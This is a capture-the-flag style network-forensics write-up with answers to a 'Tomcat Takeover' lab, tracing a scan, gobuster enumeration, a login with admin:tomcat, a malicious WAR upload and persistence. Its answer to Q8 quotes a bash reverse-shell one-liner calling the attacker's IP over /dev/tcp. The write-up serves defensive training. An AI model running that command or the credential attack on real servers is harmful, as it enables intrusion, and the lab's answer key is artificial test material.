# 🕵️‍♂️ Tomcat Takeover Lab  

Analyze network traffic using Wireshark's custom columns, filters, and statistics to identify suspicious web server administration access and potential compromise.

---

## 📂 Category
- 🖧 Network Forensics  

## 🎯 Tactics
- 🔍 Reconnaissance  
- 💻 Execution  
- 🛠️ Persistence  
- ⬆️ Privilege Escalation  
- 🔑 Credential Access  
- 🕵️ Discovery  
- 📡 Command and Control  

## 🛠️ Tools
- 🐚 Wireshark  
- 🧲 NetworkMiner  

---

## 📖 Scenario  
The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.  

---

## ❓ Questions  

**Q1** 🔍  
Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?  
>> 14.0.0.120  
<img width="940" height="408" alt="image" src="https://github.com/user-attachments/assets/cf316149-0ff6-4166-b8d1-03726424e6d0" />

**Q2** 🌏  
Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?  
>> China  
<img width="940" height="499" alt="image" src="https://github.com/user-attachments/assets/14c3c65b-8f57-40ec-9ebd-cac2bdfc880b" />

**Q3** 🌐  
From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?  
>> 8080  
<img width="940" height="619" alt="image" src="https://github.com/user-attachments/assets/6858d24e-21bc-489b-9a55-c557ab674b7a" />

**Q4** 🛠️  
Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?  
>> gobuster  
<img width="940" height="442" alt="image" src="https://github.com/user-attachments/assets/fc038d2d-f61c-49d3-9e79-be6debb8d7cf" />

**Q5** 🗂️  
After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?  
>> /manager  
<img width="940" height="789" alt="image" src="https://github.com/user-attachments/assets/bcf520f3-b7d3-47b7-aa38-cf7c8ab54228" />

**Q6** 🔑  
After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?  
>> admin:tomcat  

**Q7** 📤  
Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?  
>> JXQOZY.war  
<img width="940" height="511" alt="image" src="https://github.com/user-attachments/assets/85cea424-1a54-43f7-9eaa-6b21ab99cb4e" />

**Q8** 🐚  
After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?  
>> /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'  
<img width="940" height="572" alt="image" src="https://github.com/user-attachments/assets/fe8c42cf-19ad-4f41-8618-1a8ff52f108b" />

---

## 📝 Wireshark Filters Reference  

| **Q#** | **Filter** | **Expected Outcome** |
|--------|------------|--------------------|
| Q1 🔍 | Statistics > Conversations | Identify the source IP generating requests across multiple ports (port scanning). |
| Q2 🌏 | N/A (use ipinfo.io lookup) | Determine the country of the attacker’s IP. |
| Q3 🌐 | `ip.src == <Attacker_IP> && http` | Show HTTP traffic from attacker; identify port used for admin panel access (e.g., 8080). |
| Q4 🛠️ | `http.response.code == 404 || http.request` | Find enumeration attempts; check User-Agent headers to identify tools like gobuster. |
| Q5 🗂️ | `http && http.response.code==200` | Filter successful directory access; discover admin or manager panel paths. |
| Q6 🔑 | `http.authbasic` | Display HTTP Basic Authentication headers; identify credentials used for login. |
| Q7 📤 | `ip.src == <Attacker_IP> && http.request.method == POST` | Reveal uploaded files; locate malicious WAR file (e.g., JXQOZY.war). |
| Q8 🐚 | `ip.src == <Attacker_IP> && tcp.flags == 0x012` | Trace reverse shell TCP streams; extract commands used for persistence. |

---
